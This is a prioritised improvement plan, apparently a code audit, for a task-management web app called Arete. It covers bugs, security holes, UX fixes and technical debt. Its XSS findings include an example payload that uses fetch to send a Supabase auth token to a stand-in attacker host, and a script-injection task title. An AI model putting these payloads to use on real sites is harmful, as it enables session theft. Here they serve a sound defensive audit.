# Arete — Improvement Plan

> Generated 2026-08-26. Max 20 items ordered by ROI within each tier.

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. Push notification icon causes a 404 on every notification
- **What**: Service worker references `./icons/icon-192.png` for push/notification icons, but the `icons/` directory does not exist — the file is at `./icon-192.png`.
- **Where**: `sw.js:46-47`, `index.html:11289`
- **Why it matters**: Every push notification silently shows no icon or a broken image on platforms that enforce it. On Android this can suppress the notification entirely if the icon fails to load.
- **Effort**: S
- **Suggested fix**:
  - Change `sw.js:46-47` icon/badge paths to `'./icon-192.png'`
  - Change `index.html:11289` Notification constructor icon path to `'./icon-192.png'`

---

### 2. XSS in the checklist item editor
- **What**: Checklist item text is inserted raw into `innerHTML` without HTML-escaping, allowing stored XSS.
- **Where**: `index.html:2529` — `'<span ...>'+c.text+'</span>'`
- **Why it matters**: A user who enters `<img src=x onerror="fetch('https://evil.com?k='+localStorage.getItem('taskos_sb_access'))">` as a checklist item will execute arbitrary JS every time the task modal opens — leaking Supabase auth tokens.
- **Effort**: S
- **Suggested fix**:
  - Replace `c.text` with `esc(c.text)` (the `esc()` helper already exists at `index.html:11776`)
  - Audit all other innerHTML concatenations that use user-supplied strings (`c.notes`, `p.name`, `t.title` etc.) and apply the same fix

---

### 3. Task titles unescaped in the blocker-dependency `<option>` list
- **What**: `t.title.slice(0,45)` is injected directly into an `innerHTML` string building `<option>` elements.
- **Where**: `index.html:2543`
- **Why it matters**: A task titled `</option><script>alert(1)</script>` breaks the select DOM and could execute code in the modal.
- **Effort**: S
- **Suggested fix**:
  - Replace `t.title.slice(0,45)` with `esc(t.title.slice(0,45))` in `fillBlockerDrop()`

---

### 4. "Givelink" category still surfaces in task creation for new users
- **What**: Despite commit #73 ("Remove Givelink from Task OS"), `CATS` still includes `givelink:{l:'Givelink',e:'🟣'}` and `seed()` still creates multiple Givelink-categorized tasks. Every new account gets "Nonprofits Board Follow Ups", "Complete app", and other Givelink tasks seeded as starter data.
- **Where**: `index.html:2503` (`CATS`), `index.html:4546-4605` (`seed()`)
- **Why it matters**: New users trying Arete see an unexplained "Givelink 🟣" category and Givelink-specific tasks — instant confusion and damaged first impression.
- **Effort**: M
- **Suggested fix**:
  - Remove the `givelink` key from `CATS` (or replace with a generic `saas` or `product` category)
  - Remove Givelink-specific tasks from `seed()` and replace with generic founder/productivity templates
  - Also remove from `LIFE_AREAS.wealth.cats`, `S.givelinkMetrics`, `S.givelinkHistory` in the initial state if this is a public product (or move to a separate personal config)

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 5. AI features dead on arrival — no proxy configured
- **What**: `APP_CONFIG.aiProxy` is an empty string (`index.html:9959`). With no proxy, every AI button ("✨ AI Triage", "Plan My Day", AI commands) requires the user to supply their own Anthropic API key in Settings — completely invisible to non-technical users.
- **Where**: `index.html:9959`, `index.html:5007-5023`
- **Why it matters**: AI is the core differentiator. Users who don't find it immediately working in the trial period churn. The proxy endpoint (`/api/claude.js`) is already deployed — it just needs to be wired up.
- **Effort**: S
- **Suggested fix**:
  - Set `aiProxy: '/api/claude'` (or the full Vercel URL) in `APP_CONFIG`
  - Confirm `ANTHROPIC_API_KEY` is set in Vercel environment variables

---

### 6. No rate limiting on the AI proxy — one user can drain the Anthropic budget
- **What**: `api/claude.js` has a comment acknowledging this: "For production add per-user rate limiting (e.g. Upstash)". Any authenticated user can loop-call the endpoint and exhaust the account's Anthropic budget.
- **Where**: `api/claude.js:13`
- **Why it matters**: A single power-user or malicious actor could incur hundreds of dollars in API costs overnight. This blocks deploying the proxy to real users.
- **Effort**: M
- **Suggested fix**:
  - Add Upstash Redis rate limiting (free tier): 20 req/user/hour is generous for real use
  - Alternatively, enforce `max_tokens` hard cap to 2000 (already done) and add a per-IP daily call limit at the edge (Vercel middleware) as a simpler interim
  - Log user_id + call count to a Supabase table as a lightweight alternative

---

### 7. Default profile name is "Panos" — every new user sees the wrong name
- **What**: `let profileName = localStorage.getItem('taskos_name') || 'Panos'` — the fallback is the owner's personal name.
- **Where**: `index.html:2519`
- **Why it matters**: Dashboard says "Good morning, Panos ☀️" for every user who hasn't explicitly changed it. Shatters the illusion of a polished product immediately.
- **Effort**: S
- **Suggested fix**:
  - Change fallback to `'You'` or `''` and render "Good morning ☀️" when the name is blank
  - Prompt for a name during onboarding (the onboarding modal at `_maybeOnboard` is already wired — add a name step)

---

### 8. User's own Claude API key is synced to Supabase in plaintext
- **What**: `S.claudeKey` is part of the main state object (`index.html:2517`) which is synced to the cloud via `sbPush()`. The key is stored in the `data` column of `app_state` in Supabase.
- **Where**: `index.html:2517` (state definition), `index.html:10408` (`sbPush` body)
- **Why it matters**: Any Supabase admin, a compromised DB connection, or a future bug in RLS policies exposes every user's personal Anthropic API key.
- **Effort**: M
- **Suggested fix**:
  - Strip `claudeKey` from the sync payload before pushing: `const {claudeKey: _, ...syncState} = S`
  - Keep it localStorage-only, never in the cloud-synced blob

---

### 9. No cancel for in-flight AI requests — stuck spinner with no escape
- **What**: `callClaude()` uses `fetch()` with no `AbortController`. If the Anthropic API is slow or the proxy times out, the UI spinner runs indefinitely and there is no way to cancel.
- **Where**: `index.html:5006-5034`
- **Why it matters**: A stuck AI button locks out the whole feature area. On mobile with poor connectivity this is frequent enough to frustrate users.
- **Effort**: S
- **Suggested fix**:
  - Add `AbortController` to `callClaude()`, store it in `window._claudeAbort`
  - Add a "Cancel" button that appears after 3 seconds of waiting and calls `abort()`
  - Clear the controller after completion or error

---

### 10. Mobile bottom nav renders "Panos" on the account chip for all users
- **What**: The sidebar account chip and mobile footer chip display `profileName` (which defaults to 'Panos') without a signed-in check.
- **Where**: `index.html` — `_renderAccountChip()` function (search for `renderAccountChip`)
- **Why it matters**: Reinforces issue #7 — users see someone else's name in the persistent UI chrome, not just the greeting. Erodes trust.
- **Effort**: S (fix together with #7)
- **Suggested fix**: Same fix as #7 — use email initial or "Me" when `profileName` is the default

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 11. 14,924-line monolithic HTML file
- **What**: `index.html` contains all CSS (~700 lines), all HTML templates (~3,000 lines), and all JavaScript (~11,000 lines, 711 functions) in a single file with no modules, no build step, no tests.
- **Where**: `index.html` (entire file)
- **Why it matters**: Any change can silently break unrelated features; there's no way to test in isolation, bundle-analyze, tree-shake, or lint. PR diffs are unreadable. Onboarding a second developer is nearly impossible.
- **Effort**: L
- **Suggested fix**:
  - Adopt a minimal Vite build: separate `main.js`, `state.js`, `ui/*.js` modules, import into `index.html`
  - Don't attempt a full rewrite — extract 3-5 self-contained features (checklist, sync, AI) per sprint
  - Add a `<script type="module">` wrapper immediately to enable ESM syntax and eliminate global namespace pollution

---

### 12. `_editChecklist` global state bleeds between task opens
- **What**: `let _editChecklist = []` is a module-level mutable array. If the user opens a task, starts editing a checklist, then opens a different task without saving, `_editChecklist` still holds the previous task's items.
- **Where**: `index.html:2520`
- **Why it matters**: Users can accidentally add checklist items from one task to another. Silent data corruption.
- **Effort**: S
- **Suggested fix**:
  - Reset `_editChecklist` at the top of `openTask()` / `openAdd()` before populating from the task data
  - Ensure `closeM()` also resets it

---

### 13. Supabase project URL hardcoded in the commit history
- **What**: `APP_CONFIG.supabaseUrl` and `supabaseAnon` are committed as literal strings (`index.html:9957-9958`). The URL `bgvddpkdsftgynxyhnoc.supabase.co` reveals the project ID to anyone reading the public git history.
- **Where**: `index.html:9957-9958`
- **Why it matters**: Anon keys are designed to be public (RLS protects rows). But the project URL is needed for API calls — combined with the anon key, a bad actor can make auth attempts, consume free-tier quota, or probe for RLS misconfiguration.
- **Effort**: M
- **Suggested fix**:
  - Move secrets to Vercel environment variables and inject them at build time (Vite `import.meta.env`) or via a `/api/config` endpoint
  - For now, document that the anon key is public-by-design and ensure RLS policies are tight

---

### 14. Missing loading + error states in the Eisenhower and Goals views
- **What**: `renderGoalView()` and `renderEisenhower()` paint the UI synchronously but don't guard against empty `S.goals` / `S.tasks` being `undefined` (e.g., after a partial sync failure). An unhandled `TypeError` inside these render functions surfaces as a blank view.
- **Where**: `index.html` — search for `renderGoalView`, `renderEisenhower`
- **Why it matters**: After a failed Supabase pull where `S` is partially overwritten, users see a blank Goals or Eisenhower page with no explanation and no retry button.
- **Effort**: M
- **Suggested fix**:
  - Add a try/catch around each view render that shows a friendly error card: "Couldn't load this view — tap to retry"
  - Add null-guards: `(S.goals || [])`, `(S.tasks || [])` in all render functions

---

## 💡 P3 — Nice to have

### 15. Keyboard + screen reader accessibility gaps
- **What**: Only 90 `aria-` attribute occurrences across 14,924 lines. Interactive components (command palette, drag-and-drop task buckets, focus-mode overlay, bottom-sheet modals) have minimal ARIA markup and inconsistent focus management.
- **Where**: `index.html` — throughout
- **Why it matters**: Blocks users who rely on screen readers or keyboard-only navigation. Also affects SEO signals.
- **Effort**: L
- **Suggested fix**:
  - Start with the command palette (`cmdk`): add `role="combobox"`, `aria-expanded`, `aria-activedescendant`
  - Add `role="dialog"` and `aria-modal="true"` to all `.md` modals
  - Ensure `Tab` focus is trapped inside open modals (add a focus trap utility)

---

### 16. Service worker cache version is a hardcoded date string
- **What**: `const CACHE = 'arete-20260723'` requires a manual code change every deploy to bust the cache correctly. If forgotten, users run stale JS.
- **Where**: `sw.js:1`
- **Why it matters**: Stale caches mean bug fixes don't reach installed PWA users. Easy to forget on a fast-moving codebase.
- **Effort**: S
- **Suggested fix**:
  - Inject a build-time hash: `const CACHE = 'arete-__BUILD_HASH__'` (Vite replaces at build time)
  - Or use a simple `Date.now()` stamp injected during CI

---

### 17. No retry/backoff in `callClaude()` for transient 5xx errors
- **What**: A single 5xx from Anthropic's API shows a toast error and returns `null` — the user must manually click the AI button again.
- **Where**: `index.html:5026-5029`
- **Why it matters**: Anthropic occasionally returns 529 (overloaded). Users see "AI error 529" and assume the feature is broken rather than retrying.
- **Effort**: S
- **Suggested fix**:
  - Retry once with 1s delay on 429 (rate limit) or 5xx, then surface the error
  - Update the toast copy to "Rate limit hit — retrying…" vs. "AI error"

---

### 18. OG image URL is tied to the current Vercel deployment domain
- **What**: `og:image` on both `landing.html:16` and `index.html:25` points to `task-management-beige-eight.vercel.app` — a Vercel auto-generated URL.
- **Where**: `landing.html:16`, `index.html:25`
- **Why it matters**: If a custom domain is ever set (e.g., `arete.app`), all existing social media shares will show a broken preview image (404 on the old domain).
- **Effort**: S
- **Suggested fix**:
  - Move to a relative path (`/og-image.png`) and ensure `canonical` is set to the real domain
  - Or switch to a CDN-hosted image (Cloudflare R2) that's domain-independent

---

### 19. `showConfirm()` accepts raw HTML — callers must sanitize
- **What**: `document.getElementById('confirm-msg').innerHTML = msg` (`index.html:2807`). Most callers pass hardcoded strings, but the pattern invites future callers to pass user data.
- **Where**: `index.html:2807`
- **Why it matters**: A future developer might write `showConfirm('Delete "'+task.title+'"?', ...)` without escaping — introducing stored XSS in a confirmation dialog.
- **Effort**: S
- **Suggested fix**:
  - Change to `textContent` for the message and accept an optional `{html: true}` flag for the few callers that legitimately need bold text (like "This **cannot** be undone")

---

### 20. Landing page and app share the same Vercel deployment URL in canonical tags
- **What**: Both `landing.html` and `index.html` share `task-management-beige-eight.vercel.app` as the canonical URL. When a custom domain is applied, the canonical will be wrong causing duplicate-content signals in Google.
- **Where**: `landing.html:11`, `index.html:24`
- **Why it matters**: Minor SEO impact today; becomes a real problem as soon as a custom domain is set.
- **Effort**: S
- **Suggested fix**:
  - Parameterize the base URL through a Vercel environment variable or a build-time replacement
  - Update both canonical tags and all `og:url` values to match the real domain
